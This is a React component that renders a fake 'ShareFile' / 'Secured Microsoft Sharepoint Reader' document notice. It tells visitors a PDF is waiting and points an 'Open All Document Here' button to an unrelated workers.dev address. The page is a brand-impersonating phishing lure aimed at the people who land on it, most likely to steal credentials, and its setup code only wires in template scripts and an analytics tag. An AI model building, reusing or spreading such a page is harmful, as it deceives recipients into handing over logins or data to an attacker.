import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');

    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      
<p style={{textAlign: 'center'}}><span style={{fontSize: '36px'}}><strong>Stay Informed Of All Documents</strong></span></p>
<p><br/></p>
<ul style={{listStyleType: 'disc'}}>
<li style={{fontSize: '18px', textAlign: 'center'}}>You have a ShareFile Document</li>
<li style={{fontSize: '18px', textAlign: 'center'}}>Total Pages: 02_Scanned/PDF_Files</li>
<li style={{fontSize: '18px', textAlign: 'center'}}>Secured Microsoft Sharepoint Reader</li>
<li style={{fontSize: '18px', textAlign: 'center'}}>All Documents Are Available in PDF Format</li>
</ul>
<p><br/></p>
<p style={{textAlign: 'center'}}>
<meta charset="utf-8"/><span style={{textAlign: 'start', color: 'rgb(36, 36, 36)', backgroundColor: 'rgb(247, 218, 100)', fontSize: '15px', fontFamily: 'Aptos, sans-serif'}}><strong>      Your document is ready in PDF below. Click below to see document.</strong></span>
</p>
<p><br/></p>
<table style={{width: '33%', marginRight: 'calc(37%)', marginLeft: 'calc(31%)'}}>
<tbody>
<tr>
<td style={{width: '100%', backgroundColor: 'rgb(41, 105, 176)'}}>
<div style={{textAlign: 'center'}}><span style={{fontSize: '18px'}}>  </span><a href="https://index-k835-verification-needed-request-faxdoc.reismedrecss.workers.dev"><strong><span style={{fontSize: '18px', color: 'rgb(255, 255, 255)'}}>Open All Document Here</span></strong></a>    </div>
</td>
</tr>
</tbody>
</table>

    </>
  );
}
